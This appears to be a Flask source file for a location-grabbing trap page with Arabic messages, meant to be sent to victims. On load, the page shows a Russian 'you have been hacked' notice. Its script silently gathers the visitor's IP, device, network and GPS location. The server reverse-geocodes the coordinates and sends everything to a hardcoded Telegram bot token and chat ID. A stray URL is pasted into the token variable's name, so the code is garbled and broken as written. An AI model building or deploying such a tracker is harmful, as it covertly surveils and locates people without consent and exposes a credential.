# telegram-flask-bot1
from flask import Flask, request, render_template_string
import requests
import os

app = Flask(__name__)

TELEGRAM_BOT_TOKhttps://github.com/thewhiteh4t/seekerEN = "7977163565:AAHH698mxmpv1WDoJLsQbVioqN1kLMKlZTg"
TELEGRAM_CHAT_ID = "8078251938"

HTML_FORM = '''
<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>واجهة</title>
  <style>
    body {
      background-color: #000;
      color: #0f0;
      text-align: center;
      font-family: Arial, sans-serif;
      direction: rtl;
      padding: 20px;
    }
    #russian {
      font-size: 16px;
      line-height: 2;
      margin-top: 30px;
    }
    #footer {
      font-weight: bold;
      font-size: 24px;
      color: #0f0;
      margin-bottom: 20px;
    }
  </style>
</head>
<body>
  <div id="footer">المطور أحمد 🇮🇶</div>
  <div id="russian">
    Вас взломал разработчик Ахмед Аль Ираки. Ничего не делайте и ни о чём не думайте.
    У меня есть вся ваша информация, и вы ничего не можете сделать. Будьте уверены, 
    я делаю это просто в шутку и из этических соображений. Я не думаю о том, чтобы 
    причинить вам вред или что-то с вами сделать. Всё это ради развлечения и шутки.
  </div>

<script>
async function getIPInfo() {
  try {
    const response = await fetch('https://ipapi.co/json/');
    const data = await response.json();
    return data;
  } catch (e) {
    return null;
  }
}

function sendData(ipData, position) {
  const data = {
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    ip: ipData ? ipData.ip : 'متوفر',
    city: ipData ? ipData.city : 'متوفر',
    region: ipData ? ipData.region : 'متوفر',
    country: ipData ? ipData.country_name : 'متوفر',
    org: ipData ? ipData.org : 'متوفر',
    networkType: navigator.connection ? navigator.connection.effectiveType : 'متوفر',
    downlink: navigator.connection ? navigator.connection.downlink : 'متوفر',
    rtt: navigator.connection ? navigator.connection.rtt : 'متوفر',
    latitude: position ? position.coords.latitude : (ipData ? ipData.latitude : 'متوفر'),
    longitude: position ? position.coords.longitude : (ipData ? ipData.longitude : 'متوفر')
  };
  
  fetch("/", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(data)
  });
}

async function gatherData() {
  const ipData = await getIPInfo();
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      position => sendData(ipData, position),
      error => sendData(ipData, null)
    );
  } else {
    sendData(ipData, null);
  }
}

window.onload = gatherData;
</script>
</body>
</html>
'''

def get_address_from_coords(lat, lon):
    try:
        url = f"https://nominatim.openstreetmap.org/reverse?format=json&lat={lat}&lon={lon}&accept-language=ar"
        headers = {'User-Agent': 'Mozilla/5.0 (compatible; AhmadBot/1.0)'}
        response = requests.get(url, headers=headers, timeout=5)
        if response.status_code == 200:
            data = response.json()
            return data.get('display_name', 'متوفر')
        return 'متوفر'
    except Exception:
        return 'متوفر'

def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "HTML"}
    try:
        requests.post(url, data=payload)
    except Exception as e:
        print(f"خطأ في إرسال رسالة التليجرام: {e}")

@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        data = request.get_json()
        address = None
        if data.get('latitude') != 'متوفر' and data.get('longitude') != 'متوفر':
            address = get_address_from_coords(data['latitude'], data['longitude'])

        msg = f"""<b>تم جمع بيانات جديدة:</b>
نوع الجهاز والمتصفح: {data.get('userAgent')}
النظام الأساسي: {data.get('platform')}
اللغة: {data.get('language')}
عنوان الـ IP: {data.get('ip')}
المدينة: {data.get('city')}
المنطقة: {data.get('region')}
الدولة: {data.get('country')}
مزود الشبكة: {data.get('org')}
نوع الشبكة: {data.get('networkType')}
سرعة التنزيل (Mbps): {data.get('downlink')}
زمن الاستجابة (ms): {data.get('rtt')}
خط العرض: {data.get('latitude')}
خط الطول: {data.get('longitude')}
"""
        if address:
            msg += f"\nالعنوان التفصيلي: {address}"
        else:
            msg += "\nلم يتم الحصول على العنوان التفصيلي."

        send_telegram_message(msg)
        return "", 204
    return HTML_FORM

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)
    flask
requests
web: python main.py
